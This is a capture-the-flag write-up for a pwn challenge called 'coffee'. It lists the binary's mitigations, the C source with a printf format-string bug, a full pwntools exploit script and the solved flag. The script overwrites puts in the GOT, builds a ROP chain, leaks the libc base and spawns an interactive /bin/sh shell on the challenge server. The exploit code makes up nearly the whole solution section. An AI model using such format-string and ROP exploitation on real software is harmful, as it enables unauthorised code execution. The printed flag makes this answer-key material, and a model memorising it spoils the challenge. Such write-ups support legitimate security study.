# coffee

## Challenge

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Source

```c
#include <stdio.h>

int x = 0xc0ffee;
int main(void) {
    char buf[160];
    scanf("%159s", buf);
    if (x == 0xc0ffee) {
        printf(buf);
        x = 0;
    }
    puts("bye");
}
```

## Solution

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 34.146.101.4 --port 30002 coffee
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('coffee')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '34.146.101.4'
port = int(args.PORT or 30002)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

rop = ROP(exe)

def exec_fmt(payload):
    p = process(exe.path)
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)

str__159s = 0x403004

ropchain = flat({
    0x0: [
        rop.find_gadget(['pop rdi', 'ret'])[0],
        str__159s,
        rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0],
        exe.got['puts'],
        0,
        rop.find_gadget(['ret'])[0],
        exe.plt['__isoc99_scanf'],
        rop.find_gadget(['pop rdi', 'ret'])[0],
        exe.got['puts'] + 9,
        rop.find_gadget(['ret'])[0],
        exe.plt['puts']
        ],
    })

fmtstr = fmtstr_payload(autofmt.offset + len(ropchain)//8, {
    exe.got["puts"]: rop.find_gadget(['pop rbp', 'pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret'])[0]
    }, write_size='short')

payload = flat({
    0x0: fmtstr[0:0x20-6],
    0x20-6: b'%29$p\x00',
    0x20: [
        ropchain,
        fmtstr[0x20:],
        ],
    })

io.sendline(payload)

io.recvuntil(b'0x')
libc.address = int(io.recv(12), 16) - libc.libc_start_main_return

io.success(hex(libc.address))

io.sendline(pack(libc.sym['system']) + b"//bin/sh\x00")

io.interactive()
```

## Flag

`TSGCTF{Uhouho_gori_gori_pwn}`

